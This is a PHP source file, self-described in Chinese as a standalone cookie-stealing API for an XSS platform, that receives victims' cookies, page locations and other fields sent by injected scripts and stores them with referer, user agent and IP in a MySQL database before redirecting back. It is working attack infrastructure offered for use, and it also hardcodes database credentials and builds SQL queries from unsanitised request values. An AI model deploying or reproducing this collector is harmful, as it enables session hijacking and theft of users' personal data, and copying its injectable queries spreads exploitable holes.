<?php
/**
 * api.php 接口 - Cookie 竊取獨立運行版本
 * ----------------------------------------------------------------
 */
// 配置
$dbHost='localhost';
$dbUser='xssuser';
$dbPwd='Ss520520';
$database='xss_platform';
$tbPrefix='oc_';
define('URL_ROOT','https://xss.bossjy.ccwu.cc');

// PDO 連接
try {
    $pdo=new PDO("mysql:host=$dbHost;dbname=$database;charset=utf8mb4", $dbUser, $dbPwd);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) { exit(); }

// Helper 函數
function Tb($name) { global $tbPrefix; return $tbPrefix.$name; }
function Val($key,$type='GET',$filter=0,$default='') {
    $value=isset($_REQUEST[$key]) ? $_REQUEST[$key] : '';
    if($filter) {
        $value=str_replace(array('<','>','"',"'"), '', $value);
    }
    return $value==='' ? $default : $value;
}
function StripStr($str) { return htmlspecialchars(trim($str),ENT_QUOTES); }
function JsonEncode($arr) { return json_encode($arr, JSON_UNESCAPED_UNICODE); }
function get_ipip() { return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0'; }
function adders($str) { return $str; }

// 數據庫輔助函數
function FirstRow($sql) {
    global $pdo;
    $stmt=$pdo->query($sql);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
function FirstValue($sql) {
    global $pdo;
    $stmt=$pdo->query($sql);
    return $stmt->fetchColumn();
}
function Dataset($sql) {
    global $pdo;
    $stmt=$pdo->query($sql);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}
function AutoExecute($table,$values) {
    global $pdo;
    $cols=implode(',',array_keys($values));
    $placeholders=implode(',',array_fill(0,count($values),'?'));
    $sql="INSERT INTO $table ($cols) VALUES ($placeholders)";
    $stmt=$pdo->prepare($sql);
    $stmt->execute(array_values($values));
}
function Execute($sql) {
    global $pdo;
    return $pdo->exec($sql);
}

// 獲取 URL Key
$id=Val('urlKey','GET');
if(empty($id)) $id=Val('id','GET');

if($id){
    // 查詢項目
    $project=FirstRow("SELECT * FROM ".Tb('project')." WHERE urlKey='{$id}'");
    if(empty($project)) exit();

    // 初始化
    $content=array();
    $keys=array();

    // 從模塊獲取 keys
    $moduleIds=json_decode($project['modules'] ?? '[]');
    if(!empty($moduleIds)){
        $modulesStr=implode(',',$moduleIds);
        $modules=Dataset("SELECT * FROM ".Tb('module')." WHERE id IN ($modulesStr)");
        if(!empty($modules)){
            foreach($modules as $module){
                $moduleKeys=json_decode($module['keys'] ?? '[]',true);
                if(!empty($moduleKeys)){
                    $keys=array_merge($keys,$moduleKeys);
                }
            }
        }
    }

    // 收集用戶數據
    foreach($keys as $key){
        $content[$key]=Val($key,'REQUEST');
    }
    if(in_array('toplocation',$keys)){
        $content['toplocation']=!empty($content['toplocation']) ? $content['toplocation'] : ($content['location'] ?? '');
    }

    // 判斷是否需要 cookie
    $judgeCookie=in_array('cookie',$keys);
    $cookieHash=md5($project['id'].'_'.($content['cookie'] ?? '').'_'.($content['location'] ?? '').'_'.($content['toplocation'] ?? ''));
    $cookieExisted=FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'");

    if(!$judgeCookie || $cookieExisted<=0){
        // 服務器信息
        $serverContent=array();
        $serverContent['HTTP_REFERER']=$_SERVER['HTTP_REFERER'] ?? '';
        $referers=@parse_url($serverContent['HTTP_REFERER']);
        $domain=$referers['host'] ?? '';
        $domain=StripStr($domain);
        $serverContent['HTTP_REFERER']=StripStr($_SERVER['HTTP_REFERER'] ?? '');
        $serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT'] ?? '');
        $user_ip=get_ipip();
        $serverContent['REMOTE_ADDR']=StripStr($user_ip);
        $serverContent['IP-ADDR']=urlencode(adders($user_ip));

        // 保存數據
        $values=array(
            'projectId'=>$project['id'],
            'content'=>JsonEncode($content),
            'serverContent'=>JsonEncode($serverContent),
            'domain'=>$domain,
            'cookieHash'=>$cookieHash,
            'num'=>1,
            'addTime'=>time()
        );
        AutoExecute(Tb('project_content'),$values);
    }else{
        Execute("UPDATE ".Tb('project_content')." SET num=num+1,updateTime='".time()."' WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'");
    }

    // 跳轉
    $referer=$_SERVER['HTTP_REFERER'] ?? '';
    if(!empty($referer)){
        header("Location: $referer");
    }
}
